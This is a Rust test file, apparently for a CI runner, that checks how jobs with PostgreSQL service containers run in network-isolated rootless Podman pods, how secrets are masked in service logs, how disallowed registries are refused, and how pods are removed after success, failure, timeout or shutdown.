            ["rm", "--force", "--ignore", "--", "forge-job-7-1"],
            ["rm", "--force", "--ignore", "--", "forge-job-12-3"],
        ]
    );
    // Plan 14 C5s: the job pods too (their service containers go with
    // them); another pod is left alone.
    let pods: Vec<Vec<String>> = fake.by("podman", "pod rm").iter().map(Cmd::argv).collect();
    assert_eq!(
        pods,
        [
            [
                "pod",
                "rm",
                "--force",
                "--ignore",
                "--time=0",
                "--",
                "forge-job-7-1"
            ],
            [
                "pod",
                "rm",
                "--force",
                "--ignore",
                "--time=0",
                "--",
                "forge-job-9-2"
            ],
        ]
    );
    assert_eq!(
        fake.by("podman", "pod ps")[0].argv(),
        [
            "pod",
            "ps",
            "--filter=name=^forge-job-",
            "--format={{.Name}}"
        ]
    );
}

// ── services (plan 14 C5s) ──────────────────────────────────────────────

fn pg_image() -> String {
    format!("registry.internal/postgres@sha256:{}", "c".repeat(64))
}

/// [`definition`] with one PostgreSQL service `db`.
fn definition_with_db(script: &str, service_image: &str) -> String {
    format!(
        "{}    services:\n      - name: db\n        image: {service_image}\n        user: \"999:999\"\n        env:\n          POSTGRES_PASSWORD: test\n        tmpfs: [/var/run/postgresql]\n",
        definition(script)
    )
}

fn fake_with(def: &str, podman: Podman, service_fails: ServiceFails) -> Arc<Fake> {
    Arc::new(Fake {
        service_fails,
        ..Fake::base(def, podman)
    })
}

fn podman_order(fake: &Fake) -> Vec<String> {
    fake.calls()
        .iter()
        .filter(|c| c.program_name() == "podman")
        .map(subcommand)
        .collect()
}

fn has_context(e: &forge_errors::ForgeError, key: &str, value: &str) -> bool {
    e.context().iter().any(|(k, v)| *k == key && v == value)
}

const POD_RM: [&str; 7] = [
    "pod",
    "rm",
    "--force",
    "--ignore",
    "--time=0",
    "--",
    "forge-job-7-1",
];

/// The pod has no network; the service starts in it before the job,
/// detached; the job joins the pod; on success no service log is copied and
/// the pod is removed.
#[test]
fn a_job_with_services_runs_in_a_pod_without_network() {
    let def = definition_with_db("pg_isready -h 127.0.0.1", &pg_image());
    let fake = fake_with(&def, Podman::Exit(0), ServiceFails::No);
    let s = setup(&fake);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.result, JobResult::Succeeded, "{:?}", out.error);
    assert_eq!(
        podman_order(&fake),
        [
            "pod create",
            "create",
            "start",
            "create",
            "start",
            "rm",
            "pod rm"
        ]
    );
    let pod = &fake.by("podman", "pod create")[0];
    assert_eq!(
        pod.argv(),
        [
            "pod",
            "create",
            "--name=forge-job-7-1",
            "--network=none",
            "--share=net",
            "--memory=4g",
            "--memory-swap=4g"
        ]
    );
    let creates = fake.by("podman", "create");
    let (svc, job) = (creates[0].argv(), creates[1].argv());
    for flag in [
        "--pod=forge-job-7-1",
        "--name=forge-job-7-1-svc-db",
        "--read-only",
        "--cap-drop=all",
        "--security-opt=no-new-privileges",
        "--user=999:999",
        "--env=POSTGRES_PASSWORD=test",
        "--tmpfs=/var/run/postgresql:rw,nosuid,nodev,size=1g,mode=1777",
    ] {
        assert!(svc.iter().any(|a| a == flag), "{flag}: {svc:?}");
    }
    assert_eq!(svc.last().map(String::as_str), Some(pg_image().as_str()));
    assert!(job.iter().any(|a| a == "--pod=forge-job-7-1"), "{job:?}");
    assert!(job.iter().all(|a| !a.starts_with("--network")), "{job:?}");
    assert_eq!(
        fake.by("podman", "start")[0].argv(),
        ["start", "--", "forge-job-7-1-svc-db"]
    );
    assert_eq!(fake.by("podman", "pod rm")[0].argv(), POD_RM);
    assert!(fake.by("podman", "logs").is_empty());
    // A job without services has no pod at all.
    let plain = definition("make");
    let fake = Fake::new(&plain, Podman::Exit(0));
    let s = setup(&fake);
    run(&s, &claim(8, "fgj_8_secret", &plain), &Forge::default());
    assert_eq!(podman_order(&fake), ["create", "start", "rm"]);
}

/// FG-CI-0014: a pod or a service Podman could not create or start fails
/// the job before its container; the pod is removed on every path, and the
/// service's log tail is in the job log.
#[test]
fn a_service_that_fails_to_start_fails_the_job_and_its_pod_is_removed() {
    let def = definition_with_db("make", &pg_image());
    for (fails, reason, step) in [
        (ServiceFails::Create, "service_start", Some("create")),
        (ServiceFails::Start, "service_start", Some("start")),
        (ServiceFails::PodCreate, "pod_create", None),
    ] {
        let fake = fake_with(&def, Podman::Exit(0), fails);
        let s = setup(&fake);
        let forge = Forge::default();
        let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
        assert_eq!(out.result, JobResult::Failed);
        let err = out.error.expect("service failed");
        assert_eq!(err.code(), ErrorCode::ServiceStartFailed, "{reason}");
        assert!(has_context(&err, "reason", reason), "{err:?}");
        if let Some(step) = step {
            assert!(has_context(&err, "service", "db"), "{err:?}");
            assert!(has_context(&err, "step", step), "{err:?}");
            assert!(err
                .context()
                .iter()
                .any(|(k, v)| *k == "podman_stderr" && v.starts_with("Error:")));
            // A service that was never created has no log to read.
            let reads = usize::from(step == "start");
            assert_eq!(fake.by("podman", "logs").len(), reads, "{step}");
        } else {
            assert!(fake.by("podman", "logs").is_empty());
        }
        // The job's container never got created.
        assert!(fake
            .by("podman", "create")
            .iter()
            .all(|c| c.argv().iter().any(|a| a.contains("-svc-"))));
        assert_eq!(fake.by("podman", "pod rm").len(), 1, "{reason}");
        assert_eq!(
            podman_order(&fake).last().map(String::as_str),
            Some("pod rm")
        );
        assert!(s.exec.workspace.is_clean());
        let logs = forge.logs.lock().unwrap().join("");
        assert!(logs.contains("FG-CI-0014"), "{logs}");
    }
}

/// A failed job gets the end of each service's log, prefixed and masked
/// like its own output; then the pod is removed.
#[test]
fn a_failed_job_gets_the_service_log_tail_masked() {
    let def = definition_with_db("exit 3", &pg_image());
    let fake = fake_with(&def, Podman::Exit(3), ServiceFails::No);
    let s = setup(&fake);
    let forge = Forge::default();
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    assert_eq!(out.exit_code, Some(3));
    assert_eq!(
        fake.by("podman", "logs")[0].argv(),
        ["logs", "--tail=50", "--", "forge-job-7-1-svc-db"]
    );
    let logs = forge.logs.lock().unwrap().join("");
    assert!(
        logs.contains("[service db] FATAL: data directory not writable"),
        "{logs}"
    );
    assert!(
        logs.contains("[service db] LOG: starting [masked]"),
        "{logs}"
    );
    assert!(!logs.contains("fgj_7_secret"), "{logs}");
    // Logs before the removal.
    assert_eq!(
        podman_order(&fake),
        [
            "pod create",
            "create",
            "start",
            "create",
            "start",
            "logs",
            "rm",
            "pod rm"
        ]
    );
}

/// A timeout with services: the job container killed, the service logs
/// copied, the container and the pod removed.
#[test]
fn a_job_with_services_past_its_timeout_removes_its_pod() {
    let def = definition_with_db("sleep 100000", &pg_image());
    let fake = fake_with(&def, Podman::TimedOut, ServiceFails::No);
    let s = setup(&fake);
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &Forge::default());
    assert_eq!(out.error.expect("timed out").code(), ErrorCode::JobTimedOut);
    let order = podman_order(&fake);
    assert_eq!(&order[order.len() - 4..], ["kill", "logs", "rm", "pod rm"]);
    assert!(s.exec.workspace.is_clean());
}

/// A service image outside `image_registries` is FG-CI-0011 naming the
/// service, before any Podman call.
#[test]
fn a_service_image_outside_the_allowed_registries_is_refused() {
    let evil = format!("docker.io/library/postgres@sha256:{}", "c".repeat(64));
    let def = definition_with_db("make", &evil);
    let fake = fake_with(&def, Podman::Exit(0), ServiceFails::No);
    let s = setup(&fake);
    let out = run(&s, &claim(7, "fgj_7_secret", &def), &Forge::default());
    let err = out.error.expect("refused");
    assert_eq!(err.code(), ErrorCode::JobImageNotAllowed);
    assert!(has_context(&err, "service", "db"), "{err:?}");
    assert!(podman_order(&fake).is_empty(), "{:?}", fake.calls());
    assert!(s.exec.workspace.is_clean());
}

/// A shutdown during a job with services: the job container killed and
/// removed, then its pod.
#[test]
fn a_shutdown_removes_the_pod_of_a_job_with_services() {
    let def = definition_with_db("sleep 100000", &pg_image());
    let fake = fake_with(&def, Podman::UntilStopped, ServiceFails::No);
    let s = setup(&fake);
    let forge = Arc::new(Forge::default());
    forge
        .claims
        .lock()
        .unwrap()
        .push(claim(7, "fgj_7_secret", &def));
    let shutdown = Arc::new(AtomicBool::new(false));
    let runner = Runner {
        api: Arc::clone(&forge) as Arc<dyn RunnerApi>,
        exec: s.exec,
        heartbeat_every: Duration::from_secs(30),
        shutdown: Arc::clone(&shutdown),
    };
    let signal = {
        let (fake, shutdown) = (Arc::clone(&fake), Arc::clone(&shutdown));
        std::thread::spawn(move || {
            let until = std::time::Instant::now() + Duration::from_secs(20);
            // The job's own start (the service's came first).
            while fake.by("podman", "start").len() < 2 {
                assert!(std::time::Instant::now() < until, "never started");
                std::thread::sleep(Duration::from_millis(20));
            }
            shutdown.store(true, Ordering::SeqCst);
        })
    };
    runner.run_forever().expect("a clean stop");
    signal.join().expect("signal thread");
    // Stopped: no service log is read (review); the pod is still removed.
    let order = podman_order(&fake);
    assert_eq!(&order[order.len() - 3..], ["kill", "rm", "pod rm"]);
    assert!(fake.by("podman", "logs").is_empty());
    assert_eq!(
        forge.completed.lock().unwrap().as_slice(),
        [(7, JobResult::Failed, None)]
    );
    assert!(runner.exec.workspace.is_clean());
}

/// Real rootless Podman (plan 14 C5s): a PostgreSQL service in the job's
/// pod is reached from the job over 127.0.0.1, the job still has no route
/// out, and the pod and its containers are gone afterwards.
#[test]
#[ignore = "needs a Linux host with rootless Podman and FORGE_RUNNER_TEST_PG_IMAGE (postgres:16 pinned by digest) pullable; run on the runner host with --run-ignored"]
fn a_real_postgres_service_is_reached_over_loopback_and_nothing_leaks() {
    use crate::process::SystemRunner;
    let image = std::env::var("FORGE_RUNNER_TEST_PG_IMAGE").expect("FORGE_RUNNER_TEST_PG_IMAGE");
    let dir = tempfile::tempdir().expect("dir");
    let work = dir.path().join("work");
    let script = dir.path().join("script");
    std::fs::create_dir_all(&work).expect("work");
    std::fs::create_dir_all(&script).expect("script");
    std::fs::write(
        script.join("script.sh"),
        "i=0\nuntil pg_isready -q -h 127.0.0.1; do i=$((i+1)); [ $i -lt 60 ]; sleep 1; done\n\
         PGPASSWORD=test psql -h 127.0.0.1 -U postgres -tAc 'select 40 + 2' > /workspace/answer\n\
         ! getent hosts registry\n\
         ! pg_isready -q -t 3 -h 192.0.2.1\n\
         [ \"$(awk 'NR > 2 { print $1 }' /proc/net/dev)\" = lo: ]\n",
    )
    .expect("script");
    let plan = PodmanPlan::new(PathBuf::from("podman"), Limits::default());
    let run = |cmd: &Cmd| {
        SystemRunner
            .run(cmd, Duration::from_secs(300), &|| false, &mut |_| {})
            .expect("podman")
    };
    let pod = "forge-job-test-2";
    let svc = "forge-job-test-2-svc-db";
    let env = vec![
        ("POSTGRES_PASSWORD".to_owned(), "test".to_owned()),
        (
            "PGDATA".to_owned(),
            "/var/lib/postgresql/data/pgdata".to_owned(),
        ),
    ];
    let tmpfs = vec![
        "/var/lib/postgresql/data".to_owned(),
        "/var/run/postgresql".to_owned(),
    ];
    let steps = || -> Result<(), String> {
        let ran = run(&plan.pod_create(pod));
        if !ran.ok() {
            return Err(format!("pod create: {ran:?}"));
        }
        let ran = run(&plan.service_create(&crate::podman::ServiceContainer {
            pod,
            name: svc,
            image: &image,
            env: &env,
            user: Some("999:999"),
            tmpfs: &tmpfs,
        }));
        if !ran.ok() {
            return Err(format!("service create: {ran:?}"));
        }
        let ran = run(&plan.service_start(svc));
        if !ran.ok() {
            return Err(format!("service start: {ran:?}"));
        }
        let ran = run(&plan.create(&crate::podman::Container {
            name: pod,
            image: &image,
            work: &work,
            script_dir: &script,
            job_id: 2,
            pipeline_id: 2,
            project_id: 2,
            sha: SHA,
            pod: Some(pod),
        }));
        if !ran.ok() {
            return Err(format!("job create: {ran:?}"));
        }
        let mut output = Vec::new();
        let ran = SystemRunner
            .run(
                &plan.start(pod),
                Duration::from_secs(300),
                &|| false,
                &mut |b| output.extend_from_slice(b),
            )
            .expect("start");
        if !ran.ok() {
            let mut logs = Vec::new();
            let _ = SystemRunner.run(
                &plan.logs_tail(svc),
                Duration::from_secs(60),
                &|| false,
                &mut |b| logs.extend_from_slice(b),
            );
            return Err(format!(
                "job: {ran:?}\n{}\nservice:\n{}",
                String::from_utf8_lossy(&output),
                String::from_utf8_lossy(&logs)
            ));
        }
        // The job's container shares the pod's name (Podman keeps pod and
        // container names apart) and ran in it.
        let state = run(&plan.state(pod));
        if String::from_utf8_lossy(&state.stdout).trim() != "exited 0" {
            return Err(format!("the job container {pod}: {state:?}"));
        }
        // The pod's infra container runs the locally built pause image (no
        // pull, no `--infra-image`).
        let infra = run(&plan.pod_infra(pod));
        let infra_id = String::from_utf8_lossy(&infra.stdout).trim().to_owned();
        let image = run(&Cmd::new("podman")
            .arg("inspect")
            .arg("--type=container")
            .arg("--format={{.ImageName}}")
            .arg("--")
            .arg(&infra_id)
            .captured());
        let image = String::from_utf8_lossy(&image.stdout).trim().to_owned();
        if !image.starts_with("localhost/podman-pause:") {
            return Err(format!("infra image {image:?} ({infra:?})"));
        }
        Ok(())
    };
    let result = steps();
    let removed = run(&plan.pod_remove(pod));
    result.expect("the job reached its service");
    assert!(removed.ok(), "{removed:?}");
    assert_eq!(
        std::fs::read_to_string(work.join("answer"))
            .expect("answer")
            .trim(),
        "42"
    );
    // Nothing is left: no pod, no container.
    let pods = run(&plan.stale_pods());
    assert!(
        !String::from_utf8_lossy(&pods.stdout).contains(pod),
        "{pods:?}"
    );
    let containers = run(&plan.stale());
    assert!(
        !String::from_utf8_lossy(&containers.stdout).contains("forge-job-test-2"),
        "{containers:?}"
    );
}

/// Review: one deadline for the whole container phase. Steps that each fit
/// the job's timeout but together pass it fail with FG-CI-0010, and the pod
/// is still removed.
#[test]
fn setup_steps_share_one_deadline_and_time_out_together() {
    let def = definition_with_db("make", &pg_image()).replace("timeout: 10m", "timeout: 1s");
    let mut job = claim(7, "fgj_7_secret", &def);
    job.timeout_s = 1;
    // pod create, the service's create and start: 3 x 400 ms > 1 s.
    let fake = Arc::new(Fake {
        delay: Duration::from_millis(400),
        ..Fake::base(&def, Podman::Exit(0))
    });
    let s = setup(&fake);
    let out = run(&s, &job, &Forge::default());
    assert_eq!(out.error.expect("timed out").code(), ErrorCode::JobTimedOut);
    assert_eq!(
        podman_order(&fake),
        ["pod create", "create", "start", "logs", "pod rm"]
    );
    // Without services: the job's create and start share it too.
    let plain = definition("make").replace("timeout: 10m", "timeout: 1s");
    let mut job = claim(8, "fgj_8_secret", &plain);
    job.timeout_s = 1;
    let fake = Arc::new(Fake {
        delay: Duration::from_millis(600),
        ..Fake::base(&plain, Podman::Exit(0))
    });
    let s = setup(&fake);
    let out = run(&s, &job, &Forge::default());
    assert_eq!(out.error.expect("timed out").code(), ErrorCode::JobTimedOut);
    assert_eq!(podman_order(&fake), ["create", "start", "kill", "rm"]);
}

/// Review: a pod that cannot be removed is retried once, then the runner
/// treats it like a dirty work directory (it takes no further job).
#[test]
fn a_pod_that_cannot_be_removed_stops_the_runner_like_a_dirty_workspace() {
    let def = definition_with_db("make", &pg_image());
    let fake = Arc::new(Fake {
        pod_rm_fails: true,
        ..Fake::base(&def, Podman::Exit(0))
    });
    let s = setup(&fake);
    let forge = Arc::new(Forge::default());
    forge
        .claims
        .lock()
        .unwrap()
        .push(claim(7, "fgj_7_secret", &def));
    let runner = Runner {
        api: Arc::clone(&forge) as Arc<dyn RunnerApi>,
        exec: s.exec,
        heartbeat_every: Duration::from_secs(30),
        shutdown: Arc::new(AtomicBool::new(false)),
    };
    let err = runner.run_forever().expect_err("the runner stops");
    assert_eq!(err.code(), ErrorCode::ContainerStartFailed);
    assert!(has_context(&err, "reason", "workspace_dirty"), "{err:?}");
    assert_eq!(fake.by("podman", "pod rm").len(), 2);
    // The job itself succeeded and was reported.
    assert_eq!(
        forge.completed.lock().unwrap().as_slice(),
        [(7, JobResult::Succeeded, Some(0))]
    );
    // One retry that works: nothing is dirty.
    let fake = fake_with(&def, Podman::Exit(0), ServiceFails::No);
    let s = setup(&fake);
    let out = run(&s, &claim(8, "fgj_8_secret", &def), &Forge::default());
    assert!(!out.workspace_dirty);
}

/// Review: the job log gets the END of a long service log; a service log
/// that does not exist is not reported as unreadable.
#[test]
fn a_service_log_keeps_its_tail_and_a_missing_container_is_quiet() {
    let def = definition_with_db("exit 3", &pg_image());
    let mut long = b"FIRST-LINE\n".to_vec();
    long.extend(std::iter::repeat_n(b'x', 100 * 1024));
    long.extend_from_slice(b"\nLAST-LINE\n");
    let fake = Arc::new(Fake {
        service_log: Some(long),
        ..Fake::base(&def, Podman::Exit(3))
    });
    let s = setup(&fake);
    let forge = Forge::default();
    run(&s, &claim(7, "fgj_7_secret", &def), &forge);
    let logs = forge.logs.lock().unwrap().join("");
    assert!(logs.contains("[service db] LAST-LINE"), "the tail is kept");
    assert!(!logs.contains("FIRST-LINE"), "the head is dropped");
    let fake = Arc::new(Fake {
        service_log: None,
        ..Fake::base(&def, Podman::Exit(3))
    });
    let s = setup(&fake);
    let forge = Forge::default();
    run(&s, &claim(8, "fgj_8_secret", &def), &forge);
    let logs = forge.logs.lock().unwrap().join("");
    assert!(!logs.contains("could not be read"), "{logs}");
}
